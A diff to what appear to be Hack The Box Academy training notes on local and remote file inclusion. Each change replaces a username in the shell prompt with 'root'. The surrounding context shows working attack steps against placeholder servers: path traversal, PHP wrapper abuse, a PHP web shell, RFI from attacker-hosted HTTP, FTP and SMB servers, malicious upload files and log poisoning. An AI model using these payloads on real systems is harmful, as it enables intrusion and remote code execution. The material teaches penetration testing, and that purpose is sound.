@@ -427,7 +427,7 @@ Of course, we don't have to manually type `./` 2048 times (total of 4096 charact
 &#x20; Basic Bypasses
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
+root@htb[/htb]$ echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
 non_existing_directory/../../../etc/passwd/./././<SNIP>././././
 ```
 
@@ -468,7 +468,7 @@ The first step would be to fuzz for different available PHP pages with a tool li
 &#x20; PHP Filters
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
+root@htb[/htb]$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
 
 ...SNIP...
 
@@ -515,7 +515,7 @@ As we can see, unlike our attempt with regular LFI, using the base64 filter retu
 &#x20; PHP Filters
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d
+root@htb[/htb]$ echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d
 
 ...SNIP...
 
@@ -554,7 +554,7 @@ To do so, we can include the PHP configuration file found at (`/etc/php/X.Y/apac
 &#x20; PHP Wrappers
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
+root@htb[/htb]$ curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
 <!DOCTYPE html>
 
 <html lang="en">
@@ -571,7 +571,7 @@ Once we have the base64 encoded string, we can decode it and `grep` for `allow_u
 &#x20; PHP Wrappers
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
+root@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
 
 allow_url_include = On
 ```
@@ -587,7 +587,7 @@ So, our first step would be to base64 encode a basic PHP web shell, as follows:
 &#x20; PHP Wrappers
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' | base64
+root@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' | base64
 
 PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
 ```
@@ -601,7 +601,7 @@ We may also use cURL for the same attack, as follows:
 &#x20; PHP Wrappers
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
+root@htb[/htb]$ curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
             uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
@@ -616,7 +616,7 @@ To repeat our earlier attack but with the `input` wrapper, we can send a POST re
 &#x20; PHP Wrappers
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
+root@htb[/htb]$ curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
             uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
@@ -633,7 +633,7 @@ However, expect is an external wrapper, so it needs to be manually installed and
 &#x20; PHP Wrappers
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
+root@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
 extension=expect
 ```
 
@@ -642,7 +642,7 @@ As we can see, the `extension` configuration keyword is used to enable the `expe
 &#x20; PHP Wrappers
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
+root@htb[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
@@ -691,7 +691,7 @@ In most languages, including remote URLs is considered as a dangerous practice a
 &#x20; Remote File Inclusion (RFI)
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
+root@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
 
 allow_url_include = On
 ```
@@ -713,7 +713,7 @@ The first step in gaining remote code execution is creating a malicious script i
 &#x20; Remote File Inclusion (RFI)
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
+root@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
 ```
 
 Now, all we need to do is host this script and include it through the RFI vulnerability. It is a good idea to listen on a common HTTP port like `80` or `443`, as these ports may be whitelisted in case the vulnerable web application has a firewall preventing outgoing connections. Furthermore, we may host the script through an FTP service or an SMB service, as we will see next.
@@ -725,7 +725,7 @@ Now, we can start a server on our machine with a basic python server with the fo
 &#x20; Remote File Inclusion (RFI)
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo python3 -m http.server <LISTENING_PORT>
+root@htb[/htb]$ sudo python3 -m http.server <LISTENING_PORT>
 Serving HTTP on 0.0.0.0 port <LISTENING_PORT> (http://0.0.0.0:<LISTENING_PORT>/) ...
 ```
 
@@ -738,7 +738,7 @@ As we can see, we did get a connection on our python server, and the remote shel
 &#x20; Remote File Inclusion (RFI)
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo python3 -m http.server <LISTENING_PORT>
+root@htb[/htb]$ sudo python3 -m http.server <LISTENING_PORT>
 Serving HTTP on 0.0.0.0 port <LISTENING_PORT> (http://0.0.0.0:<LISTENING_PORT>/) ...
 
 SERVER_IP - - [SNIP] "GET /shell.php HTTP/1.0" 200 -
@@ -753,7 +753,7 @@ As mentioned earlier, we may also host our script through the FTP protocol. We c
 &#x20; Remote File Inclusion (RFI)
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo python -m pyftpdlib -p 21
+root@htb[/htb]$ sudo python -m pyftpdlib -p 21
 
 [SNIP] >>> starting FTP server on 0.0.0.0:21, pid=23686 <<<
 [SNIP] concurrency model: async
@@ -770,7 +770,7 @@ As we can see, this worked very similarly to our http attack, and the command wa
 &#x20; Remote File Inclusion (RFI)
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
+root@htb[/htb]$ curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
 ...SNIP...
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
@@ -784,7 +784,7 @@ We can spin up an SMB server using `Impacket's smbserver.py`, which allows anony
 &#x20; Remote File Inclusion (RFI)
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ impacket-smbserver -smb2support share $(pwd)
+root@htb[/htb]$ impacket-smbserver -smb2support share $(pwd)
 Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
 
 [*] Config file parsed
@@ -836,7 +836,7 @@ Our first step is to create a malicious image containing a PHP web shell code th
 &#x20; LFI and File Uploads
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
+root@htb[/htb]$ echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
 ```
 
 This file on its own is completely harmless and would not affect normal web applications in the slightest. However, if we combine it with an LFI vulnerability, then we may be able to reach remote code execution.
@@ -878,7 +878,7 @@ We can utilize the [zip](https://www.php.net/manual/en/wrappers.compression.php)
 &#x20; LFI and File Uploads
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
+root@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
 ```
 
 Note: Even though we named our zip archive as (shell.jpg), some upload forms may still detect our file as a zip archive through content-type tests and disallow its upload, so this attack has a higher chance of working if the upload of zip archives is allowed.
@@ -914,7 +914,7 @@ This script can be compiled into a `phar` file that when called would write a we
 &#x20; LFI and File Uploads
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
+root@htb[/htb]$ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
 ```
 
 Now, we should have a phar file called `shell.jpg`. Once we upload it to the web application, we can simply call it with `phar://` and provide its URL path, and then specify the phar sub-file with `/shell.txt` (URL encoded) to get the output of the command we specify with (`&cmd=id`), as follows:
@@ -1016,7 +1016,7 @@ We may also poison the log by sending a request through cURL, as follows:
 &#x20; Log Poisoning
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php" -A "<?php system($_GET['cmd']); ?>"
+root@htb[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php" -A "<?php system($_GET['cmd']); ?>"
 ```
 
 As the log should now contain PHP code, the LFI vulnerability should execute this code, and we should be able to gain remote code execution. We can specify a command to be executed with (`?cmd=id`): ![image](https://academy.hackthebox.com/storage/modules/23/rfi\_id\_repeater.png)
@@ -1052,7 +1052,7 @@ The [Attacking Web Applications with Ffuf](https://academy.hackthebox.com/module
 &#x20; Automated Scanning
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
+root@htb[/htb]$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
 
 ...SNIP...
 
@@ -1085,7 +1085,7 @@ There are a number of [LFI Wordlists](https://github.com/danielmiessler/SecLists
 &#x20; Automated Scanning
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
+root@htb[/htb]$ ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
 
 ...SNIP...
 
@@ -1129,7 +1129,7 @@ The following is an example of how we can do all of this with ffuf:
 &#x20; Automated Scanning
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
+root@htb[/htb]$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
 
 ...SNIP...
 
@@ -1158,7 +1158,7 @@ To do so, we may also use the [LFI-Jhaddix.txt](https://github.com/danielmiessle
 &#x20; Automated Scanning
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
+root@htb[/htb]$ ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
 
 ...SNIP...
 
@@ -1191,7 +1191,7 @@ As we can see, the scan returned over 60 results, many of which were not identif
 &#x20; Automated Scanning
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/apache2.conf
+root@htb[/htb]$ curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/apache2.conf
 
 ...SNIP...
         ServerAdmin webmaster@localhost
@@ -1207,7 +1207,7 @@ As we can see, we do get the default webroot path and the log path. However, in 
 &#x20; Automated Scanning
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/envvars
+root@htb[/htb]$ curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/envvars
 
 ...SNIP...
 export APACHE_RUN_USER=www-data
